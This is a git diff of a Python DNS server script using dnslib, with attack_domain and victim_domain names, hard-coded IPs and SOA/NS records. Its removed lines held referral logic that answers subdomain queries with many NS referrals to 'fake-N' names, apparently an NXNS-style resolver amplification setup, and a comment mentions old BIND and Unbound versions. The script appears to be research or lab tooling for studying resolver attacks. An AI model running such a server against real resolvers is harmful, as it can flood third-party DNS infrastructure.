@@ -25,16 +25,14 @@ class DomainName(str):
         return DomainName(item + '.' + self)
 
 
-attack_domain = DomainName('securekey.app.')
-victim_domain = DomainName('securekey.app.')
-IP = '67.205.178.106'
+victim_domain = DomainName('findall.app.')
 local_ip = '127.0.0.1'
-IP2 = '147.182.132.99'
+IP = '147.182.132.99'
 TTL = 30
 
 soa_record = SOA(
-    mname=attack_domain.ns1,  # primary name server
-    rname=attack_domain.hostmaster,  # email of the domain administrator
+    mname=victim_domain.ns1,  # primary name server
+    rname=victim_domain.hostmaster,  # email of the domain administrator
     times=(
         201307231,  # serial number
         60 * 60 * 1,  # refresh
@@ -43,12 +41,12 @@ soa_record = SOA(
         60 * 60 * 1,  # minimum
     )
 )
-ns_records = [NS(attack_domain.ns1), NS(attack_domain.ns2)]
+ns_records = [NS(victim_domain.ns1), NS(victim_domain.ns2)]
 records = {
-    attack_domain: [A(local_ip), MX(attack_domain.mail), soa_record] + ns_records,
-    attack_domain.ns1: [A(IP)],  # MX and NS records must never point to a CNAME alias (RFC 2181 section 10.3)
-    attack_domain.ns2: [A(IP)],
-    attack_domain.mail: [A(IP)],
+    victim_domain: [A(local_ip), MX(victim_domain.mail), soa_record] + ns_records,
+    victim_domain.ns1: [A(IP)],  # MX and NS records must never point to a CNAME alias (RFC 2181 section 10.3)
+    victim_domain.ns2: [A(IP)],
+    victim_domain.mail: [A(IP)],
 }
 
 referral_responses = []
@@ -66,8 +64,7 @@ def dns_response(data, client_ip):
     qtype = request.q.qtype
     qt = QTYPE[qtype]
 
-    if qn == attack_domain or qn.startswith('ns1') or qn.startswith('ns2') or \
-            qn.startswith('mail') or qn.startswith('hostmaster'):
+    if qn == victim_domain or qn.endswith('.' + victim_domain):
         for name, rrs in records.items():
             if name == qn:
                 for rdata in rrs:
@@ -76,21 +73,12 @@ def dns_response(data, client_ip):
                         reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, rqt), rclass=1, ttl=TTL, rdata=rdata))
 
         for rdata in ns_records:
-            reply.add_ar(RR(rname=attack_domain, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))
+            reply.add_ar(RR(rname=victim_domain, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))
 
-        reply.add_auth(RR(rname=attack_domain, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))
+        reply.add_auth(RR(rname=victim_domain, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))
     elif qn.startswith('fake'):
-        reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(IP2)))
-        # reply.header.rcode = 3
-    elif qn.endswith('.' + attack_domain):  # NXDomain
-        val = 0  # random.choice([0, 1])
-        if val == 0:
-            for ind, rdata in enumerate(referral_responses):
-                reply.add_auth(RR(rname=DomainName(qn), rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))
-                referral_domain = DomainName('fake-' + str(ind+1) + '.' + victim_domain)
-                reply.add_ar(RR(rname=referral_domain, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(IP)))
-        else:
-            reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(local_ip)))
+        # reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(IP2)))
+        reply.header.rcode = 3
     print("---- Reply:\n", reply)
 
     # install BIND 9.11 or earlier/ Unbound/s
